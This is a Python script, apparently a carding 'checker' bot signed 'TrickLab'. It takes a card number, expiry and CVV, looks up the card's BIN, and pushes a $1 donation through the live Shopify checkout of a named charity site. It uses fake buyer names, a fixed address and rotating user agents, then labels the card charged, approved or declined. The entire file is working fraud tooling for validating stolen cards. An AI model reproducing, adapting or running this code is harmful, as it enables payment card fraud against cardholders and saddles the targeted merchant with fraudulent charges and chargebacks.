import aiohttp
from bs4 import BeautifulSoup
from fake_useragent import UserAgent, FakeUserAgentError
import re
import json
import time
import asyncio
import random
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def find_between(s, first, last):
    """Extract a substring between two markers."""
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""

def parse_card(card_input: str):
    """Parse card details from input string."""
    try:
        cc_raw, mm, yy, cvc = card_input.strip().split("|")
        cc = " ".join(cc_raw[i:i+4] for i in range(0, len(cc_raw), 4))
        mm = str(int(mm))
        yy = "20" + yy if len(yy) == 2 else yy
        return cc, mm, yy, cvc
    except ValueError:
        return None, None, None, None

# Sample data
emails = ["nicochan275@gmail.com"]
first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam"]
last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore"]

async def sh(message):
    """Process payment using Shopify API."""
    start_time = time.time()
    logger.info("Starting payment process")
    text = message.strip()
    pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
    match = re.search(pattern, text)

    if not match:
        return "Invalid card format. Please provide a valid card number, month, year, and cvv."

    n = match.group(1)
    cc = " ".join(n[i:i+4] for i in range(0, len(n), 4))
    mm = match.group(2)
    mm = str(int(mm))
    yy = match.group(3)
    yy = yy[2:] if len(yy) == 4 and yy.startswith("20") else yy
    cvc = match.group(4)
    full_card = f"{n}|{mm}|{yy}|{cvc}"

    # Initialize UserAgent with local file
    try:
        ua = UserAgent(path='user_agents.json')
    except FakeUserAgentError as e:
        logger.error(f"Error loading user agents: {e}")
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    user_agent = ua.random
    logger.info(f"Selected user agent: {user_agent}")
    remail = random.choice(emails)
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)
    logger.info(f"Selected buyer info: email={remail}, first={rfirst}, last={rlast}")

    async with aiohttp.ClientSession() as r:
        # BIN Lookup
        try:
            async with r.get(f'https://bins.antipublic.cc/bins/{n}') as res:
                if res.status == 200:
                    z = await res.json()
                    bin = z['bin']
                    bank = z['bank']
                    brand = z['brand']
                    type = z['type']
                    level = z['level']
                    country = z['country_name']
                    flag = z['country_flag']
                    currency = z['country_currencies'][0]
                    logger.info(f"BIN Lookup: {bin}, {bank}, {brand}, {type}, {level}, {country}, {currency}")
                else:
                    logger.error(f"BIN Lookup failed: Status {res.status}")
                    return "BIN Lookup failed: Invalid response"
        except Exception as e:
            logger.error(f"BIN Lookup failed: {str(e)}")
            return "BIN Lookup failed"

        # Step 1: Add to cart
        url = "https://www.buildingnewfoundations.com/cart/add.js"
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
            'user-agent': user_agent,
        }
        data = {
            'form_type': 'product',
            'utf8': '✓',
            'id': '39555780771934',
            'quantity': '1',
            'product-id': '6630341279838',
            'section-id': 'product-template',
        }
        try:
            async with r.post(url, headers=headers, data=data) as response:
                if response.status != 200:
                    logger.error(f"Add to cart failed: Status {response.status}")
                    return "Failed to add to cart"
                logger.info("Successfully added to cart")
        except Exception as e:
            logger.error(f"Error adding to cart: {str(e)}")
            return "Failed to add to cart"

        # Step 2: Get cart token
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
            'user-agent': user_agent,
        }
        try:
            async with r.get('https://www.buildingnewfoundations.com/cart.js', headers=headers) as response:
                raw = await response.text()
                res_json = json.loads(raw)
                tok = res_json['token']
                logger.info(f"Cart token: {tok}")
        except Exception as e:
            logger.error(f"Error getting cart token: {str(e)}")
            return "Failed to get cart token"

        # Step 3: Initiate checkout
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/cart',
            'user-agent': user_agent,
        }
        data = {
            'updates[]': '1',
            'checkout': 'Check out',
        }
        try:
            async with r.post('https://www.buildingnewfoundations.com/cart', headers=headers, data=data, allow_redirects=True) as response:
                text = await response.text()
                x = find_between(text, 'serialized-session-token" content=""', '""')
                queue_token = find_between(text, '"queueToken":"', '"')
                stableid = find_between(text, 'stableId":"', '"')
                paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier":"', '"')
                logger.info(f"Checkout values: session_token={x}, queue_token={queue_token}, stableid={stableid}, paymentmethodidentifier={paymentmethodidentifier}")
                if not all([x, queue_token, stableid, paymentmethodidentifier]):
                    logger.error("One or more checkout values are missing")
                    return "Failed to initiate checkout: Missing values"
        except Exception as e:
            logger.error(f"Error initiating checkout: {str(e)}")
            return "Failed to initiate checkout"

        # Step 4: Create payment session
        headers = {
            'authority': 'checkout.pci.shopifyinc.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'user-agent': user_agent,
        }
        json_data = {
            'credit_card': {
                'number': cc,
                'month': mm,
                'year': yy,
                'verification_value': cvc,
                'name': f'{rfirst} {rlast}',
            },
            'payment_session_scope': 'buildingnewfoundations.com',
        }
        try:
            async with r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data) as response:
                sid = (await response.json())['id']
                logger.info(f"Payment session ID: {sid}")
        except Exception as e:
            logger.error(f"Error creating payment session: {str(e)}")
            return "Failed to create payment session"

        # Step 5: Submit for completion
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/',
            'user-agent': user_agent,
            'x-checkout-one-session-token': x,
            'x-checkout-web-source-id': tok,
        }
        params = {'operationName': 'SubmitForCompletion'}
        json_data = {
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!]){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}__typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
            'variables': {
                'input': {
                    'sessionInput': {'sessionToken': x},
                    'queueToken': queue_token,
                    'delivery': {
                        'deliveryLines': [{'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}}}, 'targetMerchandiseLines': {'lines': [{'stableId': stableid}]}, 'deliveryMethodTypes': ['NONE']}],
                        'supportsSplitShipping': True,
                    },
                    'merchandise': {
                        'merchandiseLines': [{'stableId': stableid, 'merchandise': {'productVariantReference': {'id': 'gid://shopify/ProductVariantMerchandise/39555780771934'}}, 'quantity': {'items': {'value': 1}}}]
                    },
                    'payment': {
                        'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': paymentmethodidentifier, 'sessionId': sid}}, 'amount': {'value': {'amount': '1', 'currencyCode': 'USD'}}}],
                        'billingAddress': {'streetAddress': {'address1': '127 Allen st', 'city': 'New York', 'countryCode': 'US', 'postalCode': '10002', 'firstName': rfirst, 'lastName': rlast}}
                    },
                    'buyerIdentity': {'email': remail, 'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'}}
                },
                'attemptToken': tok,
                'metafields': []
            }
        }
        try:
            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
                text = await response.text()
                logger.info(f"SubmitForCompletion response: {text}")
                res_json = json.loads(text)
                if 'errors' in res_json:
                    logger.error(f"GraphQL errors: {res_json['errors']}")
                    return f"Failed to submit for completion: GraphQL errors - {res_json['errors']}"
                elif 'data' in res_json:
                    submit_result = res_json['data']['submitForCompletion']
                    if 'receipt' in submit_result:
                        rid = submit_result['receipt']['id']
                        logger.info(f"Successfully submitted for completion, receipt ID: {rid}")
                    else:
                        logger.error(f"SubmitForCompletion failed: {submit_result}")
                        return f"Failed to submit for completion: {submit_result.get('reason', 'No receipt')}"
                else:
                    logger.error("Unexpected response format")
                    return "Failed to submit for completion: Unexpected response format"
        except Exception as e:
            logger.error(f"Error submitting for completion: {str(e)}")
            return f"Failed to submit for completion: {str(e)}"

        # Step 6: Poll for receipt
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.buildingnewfoundations.com',
            'user-agent': user_agent,
            'x-checkout-one-session-token': x,
            'x-checkout-web-source-id': tok,
        }
        params = {'operationName': 'PollForReceipt'}
        json_data = {
            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}__typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
            'variables': {'receiptId': rid, 'sessionToken': x}
        }
        elapsed_time = time.time() - start_time
        try:
            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
                text = await response.text()
                logger.info(f"PollForReceipt response: {text}")
                if "thank" in text.lower():
                    return f"""Card: {full_card}
Status: Charged🔥
Response: Order # confirmed
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: TrickLab"""
                elif "actionrequiredreceipt" in text.lower():
                    return f"""Card: {full_card}
Status: Approved!✅
Response: ActionRequired
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: TrickLab"""
                else:
                    fff = find_between(text, '"code":"', '"')
                    return f"""Card: {full_card}
Status: Declined!❌
Response: {fff}
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: TrickLab"""
        except Exception as e:
            logger.error(f"Error polling for receipt: {str(e)}")
            return "Failed to poll for receipt"

# Run the script
if __name__ == "__main__":
    ok = input("Card: ")
    print(asyncio.run(sh(ok)))
